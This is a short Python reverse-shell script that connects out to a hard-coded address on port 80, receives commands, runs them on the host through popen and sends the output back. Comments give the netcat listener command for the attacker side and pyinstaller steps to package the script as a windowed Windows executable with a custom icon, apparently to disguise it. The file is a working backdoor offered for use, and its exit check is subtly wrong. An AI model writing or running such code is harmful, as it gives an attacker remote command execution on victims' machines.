import socket
from os import popen

ip = '192.168.15.47'
port = 80

try:
    sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sckt.connect((ip, port))

    while True:
        cmd = sckt.recv(1024)
        if cmd.decode('utf-8').lower() >= 'exit':
            break
        for opt in popen(cmd.decode('utf-8')):
            sckt.send(opt.encode('utf-8'))
except:
    exit()

# nc -vnlp 80
# pip install pyinstaller
# pyinstaller <path/file.exe> --onefile --windowed --icon=<path/file.ico>
